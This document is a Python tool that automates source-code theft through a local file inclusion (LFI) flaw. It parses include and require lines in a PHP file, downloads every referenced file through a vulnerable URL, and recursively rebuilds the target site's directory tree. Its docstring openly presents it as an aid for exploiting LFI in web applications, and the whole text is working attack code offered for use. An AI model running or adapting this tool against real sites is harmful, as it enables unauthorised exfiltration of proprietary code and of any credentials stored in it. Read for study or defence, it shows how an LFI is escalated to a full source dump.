#!/usr/bin/env python

'''

@Author: CybeRazor
@Title: getsource.py
@Date: 19/05/2019
@License: GPLv3

@Description:
PHP source file parser and downloader

It fetches specific keywords in a PHP file (for instance: include, require, fopen, file_get_contents, etc),
parses all the matching lines to retrieve the filenames and their paths, and downloads the files recreating
their directory structure

It can be used for instance to find from a PHP file all the other required PHP files by
fetching "require" or "include" keywords and parsing the values passed to these functions

Very useful for exploiting LFI from a vulnerable WebApp : by having just one PHP file it's
possible to dump most of the source code and recreate its original directory structure

@Usage:
$ ./getsource.py [OPTIONS]

@Options:
-u, --url http://URL/TO/DOWNLOAD/RESOURCE (REQUIRED)
Url to resource that downloads PHP files

-w, --words WORDS,SEPARATED,BY,COMA (Default: include,require)
Words to fetch inside the PHP file

-f, --file PATH/TO/FILE (REQUIRED if not in recursive mode)
Path to PHP file to scan

-r, --recursive NUMBER_OF_ITERATIONS
Execute it recursively for each file in current dir
and subdirs, and iterate it for a number of times
defined on value (for scanning new files downloaded,
which otherwise would have been left unscanned)

@Dependencies:
Python requests package

To install:
$ pip install requests

'''

import requests, sys, os
from getopt import getopt, GetoptError
from time import sleep
from gc import collect

# function that prints error, usage and exits
def error(err):
	print('[x] Error: {}\n[-] Exiting script'.format(err))
	sys.exit(-1)

# function for handling HTTP GET requests
def get_request(url, failed = 0):
	# if 5 connection attempts in a row failed, stop retrying and skip this request
	if failed == 5:
		print('[-] 5 connection attempts in a row failed, skipping this request')
		return False
	try:
		r = requests.get(url, stream = True)
		r.raise_for_status()
	except requests.exceptions.RequestException:
		print('[-] Request for {} failed, retrying in 5 secs...'.format(url))
		sleep(5)
		return get_request(url, failed + 1)
	return r

# function for string parsing
def parse_string(string):
	
	# not_parsed.txt is a list of matches not parsed because they didn't represent a specific URL location
	# for instance if we choose "include" as keyword "include('core/templates/'.$this->template.'/test.php')" isn't a parsable URL
	# or just comments that includes matching keywords, for instance "//include the database configuration file"
	
	with open('not_parsed.txt', 'a') as not_parsed:
		
		# removing spaces
		string = string.replace(' ', '')
		
		# checking if ' or " are in the string, not parsing otherwise
		if "'" in string or '"' in string: string = string.split("'")[1]
		else:
			not_parsed.write(string + '\n')
			print('[*] Added to not_parsed: "{}"'.format(string))
			return False
		
		# removing '.' if first char
		if string[0] == '.': string = string[1:]
		
		# not parsing if the entire string is just '/php'
		if string == '/php':
			not_parsed.write(string + '\n')
			print('[*] Added to not_parsed: "{}"'.format(string))
			return False
		
		# if last character is a '/' not parsing
		if string[-1:] == '/':
			not_parsed.write(string + '\n')
			print('[*] Added to not_parsed: "{}"'.format(string))
			return False
		
	return string

# function for file downloading
def download_file(url, filepath):
	print('[*] Getting file from: ' + url)
	r = get_request(url)
	# if request failed
	if not r:
		with open('bad_requests.txt', 'a') as logfile: logfile.write('URL: {}\tFilepath: {}\n'.format(url, filepath))
		print('[-] File "{}" not downloaded\n[-] URL and filepath logged in "bad_requests.txt"'.format(filepath))
		return
	# retrieving filesize from Content-Lenght header
	total_length = int(r.headers['Content-Length'])
	# initializing progressbar var
	dl = 0
	# opening file in write-binary mode
	with open(filepath, 'wb') as file_save:
		# saving content in chunks of 4096 bytes (4KiB)
		for chunk in r.iter_content(chunk_size = 4096):
			if chunk:
				# incrementing the progress bar
				dl += len(chunk)
				file_save.write(chunk)
				done = int(50 * dl / total_length)
				# writing the progress bar
				sys.stdout.write('\r[{}{}]'.format('=' * done, ' ' * (50 - done)))
				sys.stdout.flush()
	print('\n[+] Saved file in ' + filepath)

# main function
def main(base_url, words, file_scan):
	
	# if file to scan not specified or does not exist, print error and exit
	if not file_scan: error('file to scan not specified')
	elif not os.path.isfile(file_scan): error('file to scan doesn\'t exist')
	
	# looping for every word to fetch
	for word in words:
		print('[*] Fetching "{}" in "{}"'.format(word, file_scan))
		
		# build matchlist
		matchlist = [line for line in open(file_scan, 'r') if word in line]
		
		# if there are no matches, skip to next word
		if len(matchlist) == 0:
			print('[-] There are no matches for "{}" in "{}"'.format(word, file_scan))
			continue
		
		# if server URL/IP does not start with http, append 'http://' to avoid Python requests library error
		if base_url[:4] != 'http':
			base_url = 'http://' + base_url
		
		# saving current directory pathname
		orig_dir = os.getcwd()
		
		for word_match in matchlist:
			
			# parsing string from matchlist lines
			parsed = parse_string(word_match)
			if not parsed: continue
			
			# appending the parsed string to the url
			url = base_url + parsed
			# splitting the string for rebuilding the directory structure, the last part will be the filename, all the previous parts are directories
			dirstr = parsed.split('/')
			filename = dirstr[-1]
			for i in range(1, len(dirstr) - 1):
				# if the directory does not exist: create it, then change working directory into it
				if not os.path.isdir(dirstr[i]): os.mkdir(dirstr[i])
				os.chdir(dirstr[i])
			
			# if file already exists do not send request
			if os.path.isfile(filename):
				print('[+] File "{}" already exists, request not sent'.format(parsed))
				# go back to main directory
				os.chdir(orig_dir)
			else:
				# download file and go back to main directory
				r = download_file(url, parsed)
				os.chdir(orig_dir)
	
	print('[+] Done')

# entry point
if __name__ == '__main__':
	
	print('[+] Started script ' + sys.argv[0])
	
	# retrieving args
	base_url = ''
	file_scan = ''
	words = ['include', 'require']
	iterations = False
	try: opts, args = getopt(sys.argv[1:], 'u:w:f:r:', ['url=', 'words=', 'file=', 'recursive='])
	except GetoptError: error('error while fetching args')
	for opt, arg in opts:
		if opt in ('-u', '--url'): base_url = arg
		elif opt in ('-w', '--words'): words = arg.split(',')
		elif opt in ('-f', '--file'): file_scan = arg
		elif opt in ('-r', '--recursive'): iterations = int(arg)
	if not base_url: error('server URL not specified')
	if not iterations:
		if not file_scan: error('file to scan not specified')
		elif not os.path.isfile(file_scan): error('file to scan doesn\'t exist')
	
	
	
	# checking if recursive mode is selected, run with single file otherwise
	if not iterations: main(base_url, words, file_scan)
	else:
		# iterating 10 times
		for x in xrange(iterations):
			# using os.walk() to surf through dirs and subdirs
			for cwd, dirs, files in os.walk(os.getcwd()):
				# when a file is found
				for f in files:
					# if it's not too heavy (less than 1MB) and it's not this file
					if os.path.getsize(os.path.join(cwd, f)) < 1048576 and f != sys.argv[0]:
						# execute the main function passing this file
						main(base_url, words, os.path.join(cwd, f))
			# call garbage collector to clean memory each time an iteration is completed
			collect()
	
	print('[+] Exiting script')
